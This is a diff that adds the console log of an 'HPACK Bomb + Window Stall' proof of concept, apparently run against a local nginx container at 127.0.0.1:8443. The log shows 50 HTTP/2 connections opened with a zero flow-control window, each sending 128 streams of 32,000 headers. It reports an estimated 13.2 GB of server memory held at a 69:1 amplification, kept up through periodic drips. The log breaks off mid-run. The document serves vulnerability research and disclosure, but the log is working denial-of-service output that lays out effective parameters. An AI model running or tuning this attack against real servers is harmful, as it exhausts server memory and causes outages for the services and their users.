@@ -1,0 +1,632 @@
+
+======================================================================
+  HPACK Bomb + Window Stall PoC
+  Target:      127.0.0.1:8443
+  Connections: 50
+  Streams:     128 per connection
+  Headers:     32,000 per stream
+  Hold:        120s (drip every 30s)
+======================================================================
+
+  Estimated server memory:
+    Per stream:     2.1 MB
+    Per connection: 270 MB
+    Total:          13482 MB (13.2 GB)
+    Wire upload:    195 MB
+    Amplification:  69:1
+
+[*] Phase 1a: Establishing 50 TLS+H2 connections...
+  [conn 0] TLS + h2 connected
+  [conn 1] TLS + h2 connected
+  [conn 2] TLS + h2 connected
+  [conn 3] TLS + h2 connected
+  [conn 4] TLS + h2 connected
+  [conn 5] TLS + h2 connected
+  [conn 6] TLS + h2 connected
+  [conn 7] TLS + h2 connected
+  [conn 8] TLS + h2 connected
+  [conn 9] TLS + h2 connected
+  [conn 10] TLS + h2 connected
+  [conn 11] TLS + h2 connected
+  [conn 12] TLS + h2 connected
+  [conn 13] TLS + h2 connected
+  [conn 14] TLS + h2 connected
+  [conn 15] TLS + h2 connected
+  [conn 16] TLS + h2 connected
+  [conn 17] TLS + h2 connected
+  [conn 18] TLS + h2 connected
+  [conn 19] TLS + h2 connected
+  [conn 20] TLS + h2 connected
+  [conn 21] TLS + h2 connected
+  [conn 22] TLS + h2 connected
+  [conn 23] TLS + h2 connected
+  [conn 24] TLS + h2 connected
+  [conn 25] TLS + h2 connected
+  [conn 26] TLS + h2 connected
+  [conn 27] TLS + h2 connected
+  [conn 28] TLS + h2 connected
+  [conn 29] TLS + h2 connected
+  [conn 30] TLS + h2 connected
+  [conn 31] TLS + h2 connected
+  [conn 32] TLS + h2 connected
+  [conn 33] TLS + h2 connected
+  [conn 34] TLS + h2 connected
+  [conn 35] TLS + h2 connected
+  [conn 36] TLS + h2 connected
+  [conn 37] TLS + h2 connected
+  [conn 38] TLS + h2 connected
+  [conn 39] TLS + h2 connected
+  [conn 0] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 40] TLS + h2 connected
+  [conn 1] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 41] TLS + h2 connected
+  [conn 2] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 42] TLS + h2 connected
+  [conn 3] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 43] TLS + h2 connected
+  [conn 4] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 44] TLS + h2 connected
+  [conn 5] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 45] TLS + h2 connected
+  [conn 6] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 46] TLS + h2 connected
+  [conn 7] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 47] TLS + h2 connected
+  [conn 8] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 48] TLS + h2 connected
+  [conn 9] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 49] TLS + h2 connected
+  [conn 10] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 11] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 12] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 13] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 14] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 15] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 16] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 17] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 18] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 19] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 20] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 21] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 22] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 23] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 24] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 25] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 26] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 27] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 28] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 29] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 30] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 31] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 32] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 33] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 34] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 35] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 36] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 37] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 38] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 39] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 40] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 41] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 42] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 43] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 44] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 45] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 46] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 47] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 48] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+  [conn 49] H2 handshake done (INITIAL_WINDOW_SIZE=0)
+    50/50 connections established in 4.5s
+[*] Phase 1b: Sending HPACK bombs on all 50 connections...
+  [conn 0] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 0] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 1] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 1] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 2] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 2] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 3] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 3] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 4] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 4] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 5] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 5] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 6] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 6] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 7] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 7] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 8] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 8] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 9] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 9] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 10] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 10] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 11] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 11] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 12] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 12] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 13] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 13] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 14] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 14] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 15] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 15] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 16] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 16] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 17] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 17] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 18] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 18] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 19] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 19] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 20] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 20] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 21] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 21] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 22] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 22] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 23] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 23] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 24] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 24] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 25] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 25] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 26] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 26] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 27] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 27] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 28] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 28] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 29] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 29] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 30] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 30] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 31] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 31] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 32] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 32] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 33] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 33] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 34] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 34] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 35] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 35] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 36] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 36] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 37] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 37] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 38] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 38] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 39] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 39] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 40] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 40] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 41] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 41] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 42] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 42] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 43] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 43] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 44] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 44] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 45] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 45] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 46] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 46] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 47] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 47] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 48] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 48] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 49] Building HPACK bomb: 32000 headers/stream, 128 streams
+  [conn 49] HPACK block size: 32,005 bytes (31.3 KB)
+  [conn 5] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 4] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 11] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 19] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 0] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 22] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 12] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 13] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 6] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 8] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 3] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 16] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 7] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 24] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 10] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 14] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 28] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 1] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 20] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 21] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 2] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 15] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 25] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 18] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 30] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 32] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 9] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 37] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 27] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 34] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 35] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 17] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 26] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 29] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 39] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 42] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 36] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 41] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 23] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 40] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 31] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 47] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 48] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 44] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 43] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 38] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 45] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 33] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 46] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+  [conn 49] Sent 128 streams, total wire: 4,098,944 bytes (3.9 MB)
+    Connection 5: sent 3.9 MB
+    Connection 1: sent 3.9 MB
+    Connection 37: sent 3.9 MB
+    Connection 34: sent 3.9 MB
+    Connection 35: sent 3.9 MB
+    Connection 36: sent 3.9 MB
+    Connection 41: sent 3.9 MB
+    Connection 42: sent 3.9 MB
+    Connection 39: sent 3.9 MB
+    Connection 40: sent 3.9 MB
+    Connection 47: sent 3.9 MB
+    Connection 48: sent 3.9 MB
+    Connection 38: sent 3.9 MB
+    Connection 44: sent 3.9 MB
+    Connection 43: sent 3.9 MB
+    Connection 45: sent 3.9 MB
+    Connection 49: sent 3.9 MB
+    Connection 46: sent 3.9 MB
+    Connection 0: sent 3.9 MB
+    Connection 4: sent 3.9 MB
+    Connection 2: sent 3.9 MB
+    Connection 3: sent 3.9 MB
+    Connection 6: sent 3.9 MB
+    Connection 7: sent 3.9 MB
+    Connection 8: sent 3.9 MB
+    Connection 9: sent 3.9 MB
+    Connection 10: sent 3.9 MB
+    Connection 11: sent 3.9 MB
+    Connection 12: sent 3.9 MB
+    Connection 13: sent 3.9 MB
+    Connection 14: sent 3.9 MB
+    Connection 15: sent 3.9 MB
+    Connection 16: sent 3.9 MB
+    Connection 17: sent 3.9 MB
+    Connection 18: sent 3.9 MB
+    Connection 19: sent 3.9 MB
+    Connection 20: sent 3.9 MB
+    Connection 21: sent 3.9 MB
+    Connection 22: sent 3.9 MB
+    Connection 23: sent 3.9 MB
+    Connection 24: sent 3.9 MB
+    Connection 25: sent 3.9 MB
+    Connection 26: sent 3.9 MB
+    Connection 27: sent 3.9 MB
+    Connection 28: sent 3.9 MB
+    Connection 29: sent 3.9 MB
+    Connection 30: sent 3.9 MB
+    Connection 31: sent 3.9 MB
+    Connection 32: sent 3.9 MB
+    Connection 33: sent 3.9 MB
+
+[*] Phase 1 complete: 50 connections, 195.5 MB uploaded in 2.3s
+    Upload rate: 85.5 MB/s
+
+[*] Phase 2: Holding server memory for 120s (drip every 30s)...
+    Monitor RSS with: docker exec nginx-h2-poc /usr/bin/python3 /poc/monitor_rss.py
+    Press Ctrl+C to stop early.
+
+  [conn 0] Holding for 120s (drip every 30s)
+  [conn 1] Holding for 120s (drip every 30s)
+  [conn 2] Holding for 120s (drip every 30s)
+  [conn 3] Holding for 120s (drip every 30s)
+  [conn 4] Holding for 120s (drip every 30s)
+  [conn 5] Holding for 120s (drip every 30s)
+  [conn 6] Holding for 120s (drip every 30s)
+  [conn 7] Holding for 120s (drip every 30s)
+  [conn 8] Holding for 120s (drip every 30s)
+  [conn 9] Holding for 120s (drip every 30s)
+  [conn 10] Holding for 120s (drip every 30s)
+  [conn 11] Holding for 120s (drip every 30s)
+  [conn 12] Holding for 120s (drip every 30s)
+  [conn 13] Holding for 120s (drip every 30s)
+  [conn 14] Holding for 120s (drip every 30s)
+  [conn 15] Holding for 120s (drip every 30s)
+  [conn 16] Holding for 120s (drip every 30s)
+  [conn 17] Holding for 120s (drip every 30s)
+  [conn 18] Holding for 120s (drip every 30s)
+  [conn 19] Holding for 120s (drip every 30s)
+  [conn 20] Holding for 120s (drip every 30s)
+  [conn 21] Holding for 120s (drip every 30s)
+  [conn 22] Holding for 120s (drip every 30s)
+  [conn 23] Holding for 120s (drip every 30s)
+  [conn 24] Holding for 120s (drip every 30s)
+  [conn 25] Holding for 120s (drip every 30s)
+  [conn 26] Holding for 120s (drip every 30s)
+  [conn 27] Holding for 120s (drip every 30s)
+  [conn 28] Holding for 120s (drip every 30s)
+  [conn 29] Holding for 120s (drip every 30s)
+  [conn 30] Holding for 120s (drip every 30s)
+  [conn 31] Holding for 120s (drip every 30s)
+  [conn 32] Holding for 120s (drip every 30s)
+  [conn 33] Holding for 120s (drip every 30s)
+  [conn 34] Holding for 120s (drip every 30s)
+  [conn 35] Holding for 120s (drip every 30s)
+  [conn 36] Holding for 120s (drip every 30s)
+  [conn 37] Holding for 120s (drip every 30s)
+  [conn 38] Holding for 120s (drip every 30s)
+  [conn 39] Holding for 120s (drip every 30s)
+  [conn 40] Holding for 120s (drip every 30s)
+  [conn 41] Holding for 120s (drip every 30s)
+  [conn 42] Holding for 120s (drip every 30s)
+  [conn 43] Holding for 120s (drip every 30s)
+  [conn 44] Holding for 120s (drip every 30s)
+  [conn 45] Holding for 120s (drip every 30s)
+  [conn 46] Holding for 120s (drip every 30s)
+  [conn 47] Holding for 120s (drip every 30s)
+  [conn 48] Holding for 120s (drip every 30s)
+  [conn 49] Holding for 120s (drip every 30s)
+  [conn 0] Drip #1 at 30s (128 streams)
+  [conn 4] Drip #1 at 30s (128 streams)
+  [conn 3] Drip #1 at 30s (128 streams)
+  [conn 1] Drip #1 at 30s (128 streams)
+  [conn 2] Drip #1 at 30s (128 streams)
+  [conn 10] Drip #1 at 30s (128 streams)
+  [conn 6] Drip #1 at 30s (128 streams)
+  [conn 16] Drip #1 at 30s (128 streams)
+  [conn 30] Drip #1 at 30s (128 streams)
+  [conn 14] Drip #1 at 30s (128 streams)
+  [conn 38] Drip #1 at 30s (128 streams)
+  [conn 24] Drip #1 at 30s (128 streams)
+  [conn 11] Drip #1 at 30s (128 streams)
+  [conn 33] Drip #1 at 30s (128 streams)
+  [conn 29] Drip #1 at 30s (128 streams)
+  [conn 27] Drip #1 at 30s (128 streams)
+  [conn 19] Drip #1 at 30s (128 streams)
+  [conn 41] Drip #1 at 30s (128 streams)
+  [conn 43] Drip #1 at 30s (128 streams)
+  [conn 39] Drip #1 at 30s (128 streams)
+  [conn 12] Drip #1 at 30s (128 streams)
+  [conn 5] Drip #1 at 30s (128 streams)
+  [conn 42] Drip #1 at 30s (128 streams)
+  [conn 34] Drip #1 at 30s (128 streams)
+  [conn 26] Drip #1 at 30s (128 streams)
+  [conn 15] Drip #1 at 30s (128 streams)
+  [conn 44] Drip #1 at 30s (128 streams)
+  [conn 25] Drip #1 at 30s (128 streams)
+  [conn 45] Drip #1 at 30s (128 streams)
+  [conn 36] Drip #1 at 30s (128 streams)
+  [conn 31] Drip #1 at 30s (128 streams)
+  [conn 9] Drip #1 at 30s (128 streams)
+  [conn 18] Drip #1 at 30s (128 streams)
+  [conn 28] Drip #1 at 30s (128 streams)
+  [conn 7] Drip #1 at 30s (128 streams)
+  [conn 49] Drip #1 at 30s (128 streams)
+  [conn 35] Drip #1 at 30s (128 streams)
+  [conn 47] Drip #1 at 30s (128 streams)
+  [conn 8] Drip #1 at 30s (128 streams)
+  [conn 13] Drip #1 at 30s (128 streams)
+  [conn 40] Drip #1 at 30s (128 streams)
+  [conn 32] Drip #1 at 30s (128 streams)
+  [conn 21] Drip #1 at 30s (128 streams)
+  [conn 17] Drip #1 at 30s (128 streams)
+  [conn 37] Drip #1 at 30s (128 streams)
+  [conn 20] Drip #1 at 30s (128 streams)
+  [conn 22] Drip #1 at 30s (128 streams)
+  [conn 46] Drip #1 at 30s (128 streams)
+  [conn 48] Drip #1 at 30s (128 streams)
+  [conn 23] Drip #1 at 30s (128 streams)
+  [conn 0] Drip #2 at 60s (128 streams)
+  [conn 4] Drip #2 at 60s (128 streams)
+  [conn 3] Drip #2 at 60s (128 streams)
+  [conn 1] Drip #2 at 60s (128 streams)
+  [conn 2] Drip #2 at 60s (128 streams)
+  [conn 16] Drip #2 at 60s (128 streams)
+  [conn 14] Drip #2 at 60s (128 streams)
+  [conn 30] Drip #2 at 60s (128 streams)
+  [conn 6] Drip #2 at 60s (128 streams)
+  [conn 10] Drip #2 at 60s (128 streams)
+  [conn 24] Drip #2 at 60s (128 streams)
+  [conn 11] Drip #2 at 60s (128 streams)
+  [conn 38] Drip #2 at 60s (128 streams)
+  [conn 27] Drip #2 at 60s (128 streams)
+  [conn 42] Drip #2 at 60s (128 streams)
+  [conn 33] Drip #2 at 60s (128 streams)
+  [conn 45] Drip #2 at 60s (128 streams)
+  [conn 12] Drip #2 at 60s (128 streams)
+  [conn 47] Drip #2 at 60s (128 streams)
+  [conn 7] Drip #2 at 60s (128 streams)
+  [conn 29] Drip #2 at 60s (128 streams)
+  [conn 37] Drip #2 at 60s (128 streams)
+  [conn 36] Drip #2 at 60s (128 streams)
+  [conn 19] Drip #2 at 60s (128 streams)
+  [conn 18] Drip #2 at 60s (128 streams)
+  [conn 31] Drip #2 at 60s (128 streams)
+  [conn 17] Drip #2 at 60s (128 streams)
+  [conn 46] Drip #2 at 60s (128 streams)
+  [conn 9] Drip #2 at 60s (128 streams)
+  [conn 8] Drip #2 at 60s (128 streams)
+  [conn 23] Drip #2 at 60s (128 streams)
+  [conn 13] Drip #2 at 60s (128 streams)
+  [conn 39] Drip #2 at 60s (128 streams)
+  [conn 21] Drip #2 at 60s (128 streams)
+  [conn 44] Drip #2 at 60s (128 streams)
+  [conn 5] Drip #2 at 60s (128 streams)
+  [conn 26] Drip #2 at 60s (128 streams)
+  [conn 41] Drip #2 at 60s (128 streams)
+  [conn 20] Drip #2 at 60s (128 streams)
+  [conn 48] Drip #2 at 60s (128 streams)
+  [conn 15] Drip #2 at 60s (128 streams)
+  [conn 49] Drip #2 at 60s (128 streams)
+  [conn 43] Drip #2 at 60s (128 streams)
+  [conn 34] Drip #2 at 60s (128 streams)
+  [conn 25] Drip #2 at 60s (128 streams)
+  [conn 28] Drip #2 at 60s (128 streams)
+  [conn 40] Drip #2 at 60s (128 streams)
+  [conn 22] Drip #2 at 60s (128 streams)
+  [conn 35] Drip #2 at 60s (128 streams)
+  [conn 32] Drip #2 at 60s (128 streams)
+  [conn 0] Drip #3 at 90s (128 streams)
+  [conn 4] Drip #3 at 90s (128 streams)
+  [conn 3] Drip #3 at 90s (128 streams)
+  [conn 1] Drip #3 at 90s (128 streams)
+  [conn 16] Drip #3 at 90s (128 streams)
+  [conn 2] Drip #3 at 90s (128 streams)
+  [conn 14] Drip #3 at 90s (128 streams)
+  [conn 30] Drip #3 at 90s (128 streams)
+  [conn 6] Drip #3 at 90s (128 streams)
+  [conn 10] Drip #3 at 90s (128 streams)
+  [conn 24] Drip #3 at 90s (128 streams)
+  [conn 11] Drip #3 at 90s (128 streams)
+  [conn 38] Drip #3 at 90s (128 streams)
+  [conn 27] Drip #3 at 90s (128 streams)
+  [conn 42] Drip #3 at 90s (128 streams)
+  [conn 33] Drip #3 at 90s (128 streams)
+  [conn 45] Drip #3 at 90s (128 streams)
+  [conn 36] Drip #3 at 90s (128 streams)
+  [conn 7] Drip #3 at 90s (128 streams)
+  [conn 12] Drip #3 at 90s (128 streams)
+  [conn 29] Drip #3 at 90s (128 streams)
+  [conn 8] Drip #3 at 90s (128 streams)
+  [conn 31] Drip #3 at 90s (128 streams)
+  [conn 37] Drip #3 at 90s (128 streams)
+  [conn 15] Drip #3 at 90s (128 streams)
+  [conn 39] Drip #3 at 90s (128 streams)
+  [conn 18] Drip #3 at 90s (128 streams)
+  [conn 19] Drip #3 at 90s (128 streams)
+  [conn 46] Drip #3 at 90s (128 streams)
+  [conn 5] Drip #3 at 90s (128 streams)
+  [conn 20] Drip #3 at 90s (128 streams)
+  [conn 9] Drip #3 at 90s (128 streams)
+  [conn 49] Drip #3 at 90s (128 streams)
+  [conn 32] Drip #3 at 90s (128 streams)
+  [conn 13] Drip #3 at 90s (128 streams)
+  [conn 26] Drip #3 at 90s (128 streams)
+  [conn 17] Drip #3 at 90s (128 streams)
+  [conn 21] Drip #3 at 90s (128 streams)
+  [conn 47] Drip #3 at 90s (128 streams)
+  [conn 44] Drip #3 at 90s (128 streams)
+  [conn 35] Drip #3 at 90s (128 streams)
+  [conn 41] Drip #3 at 90s (128 streams)
+  [conn 28] Drip #3 at 90s (128 streams)
+  [conn 43] Drip #3 at 90s (128 streams)
+  [conn 23] Drip #3 at 90s (128 streams)
+  [conn 48] Drip #3 at 90s (128 streams)
+  [conn 25] Drip #3 at 90s (128 streams)
+  [conn 40] Drip #3 at 90s (128 streams)
+  [conn 22] Drip #3 at 90s (128 streams)
+  [conn 34] Drip #3 at 90s (128 streams)
+  [conn 0] Drip #4 at 120s (128 streams)
+  [conn 0] Hold phase ended after 120s, 4 drips
+  [conn 4] Drip #4 at 120s (128 streams)
+  [conn 4] Hold phase ended after 120s, 4 drips
+  [conn 3] Drip #4 at 120s (128 streams)
+  [conn 3] Hold phase ended after 120s, 4 drips
+  [conn 1] Drip #4 at 120s (128 streams)
+  [conn 1] Hold phase ended after 120s, 4 drips
+  [conn 16] Drip #4 at 120s (128 streams)
+  [conn 16] Hold phase ended after 120s, 4 drips
+  [conn 2] Drip #4 at 120s (128 streams)
+  [conn 2] Hold phase ended after 120s, 4 drips
+  [conn 14] Drip #4 at 120s (128 streams)
+  [conn 14] Hold phase ended after 120s, 4 drips
+  [conn 6] Drip #4 at 120s (128 streams)
+  [conn 6] Hold phase ended after 120s, 4 drips
+  [conn 30] Drip #4 at 120s (128 streams)
+  [conn 30] Hold phase ended after 120s, 4 drips
+  [conn 10] Drip #4 at 120s (128 streams)
+  [conn 10] Hold phase ended after 120s, 4 drips
+  [conn 24] Drip #4 at 120s (128 streams)
+  [conn 24] Hold phase ended after 120s, 4 drips
+  [conn 11] Drip #4 at 120s (128 streams)
+  [conn 11] Hold phase ended after 120s, 4 drips
+  [conn 38] Drip #4 at 120s (128 streams)
+  [conn 38] Hold phase ended after 120s, 4 drips
+  [conn 27] Drip #4 at 120s (128 streams)
